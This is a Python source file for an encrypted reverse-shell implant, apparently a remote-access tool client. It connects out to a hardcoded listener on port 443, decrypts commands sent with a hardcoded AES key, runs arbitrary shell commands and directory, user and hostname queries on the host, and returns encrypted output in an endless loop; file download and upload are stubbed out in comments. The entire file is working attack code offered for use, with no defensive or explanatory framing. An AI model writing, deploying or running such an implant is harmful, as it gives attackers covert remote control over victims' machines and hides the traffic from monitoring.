import os, sys, subprocess, socket, time, hashlib, base64
from Crypto import Random
from Crypto.Cipher import AES

lhost = "127.0.0.1"
lport = 443
result = ''

# This is the key for the AES encryption, can be modified
CIPHER = "LUJw_q7aaSNPSU=aSX*!9TU&n#Y&yh2-2+L*"

class AESCipher(object):
    """
    A classical AES Cipher. Can use any size of data and any size of password thanks to padding.
    Also ensure the coherence and the type of the data with a unicode to byte converter.
    """
    def __init__(self, key):
        self.bs = 16
        self.key = hashlib.sha256(AESCipher.str_to_bytes(key)).digest()

    @staticmethod
    def str_to_bytes(data):
        u_type = type(b''.decode('utf-8'))
        if isinstance(data, u_type):
            return data.encode('utf-8')
        return data

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * AESCipher.str_to_bytes(chr(self.bs - len(s) % self.bs))

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s)-1:])]

    def encrypt(self, raw):
        raw = self._pad(AESCipher.str_to_bytes(raw))
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw)).decode('utf-8')

    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

# establish cipher
cipher = AESCipher(key=CIPHER)

# Build socket connection to server
def client():
  global result
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((lhost, lport))
  while True:
    command = s.recv(2048)
    decrypted = cipher.decrypt(command)
    runCommand(decrypted)
    encrypted = cipher.encrypt(result)
    s.send(encrypted)

# Download file from target

# Upload file to target

# Shell functionality
def shell(command):
  prochandle = subprocess.Popen(command,  shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
  prochandle.wait()
  return prochandle.stdout.read() + prochandle.stderr.read()

# run commands
def runCommand(command):
  global result
  
  # Change current directory
  if command.lower().startswith('cd'):
    params = command.split()
    os.chdir(params[1])
    result = '%s\n' % (os.getcwd())

  # Download file from target
  #elif command.lower().startswith('download'):

  # Get process ID
  elif command.lower().startswith('getpid'):
    result = '%s\n' % (os.getpid()) 

  # Get hostname
  elif command.lower().startswith('hostname'):
    result = '%s\n' % (socket.gethostname())

  # List current directory
  elif command.lower().startswith('ls'):
    list = os.listdir(os.getcwd())
    result = ''
    for i in list:
      result += '%s\n' % (i)

  # Get present working directory
  elif command.lower().startswith('pwd'):
    result = '%s\n' % (os.getcwd())

  # Execute shell command
  elif command.lower().startswith('shell'):
    params = command.split()
    result = shell(params[1:])

  # Upload file to target
  #elif command.lower().startswith('upload'):

  # Get current user
  elif command.lower().startswith('whoami'):
    result = '%s\n' % (os.getlogin())
    
  # Else just pass and don't execute anything
  else:
    pass

# Build main function
if __name__ == '__main__':
  while True:
    client()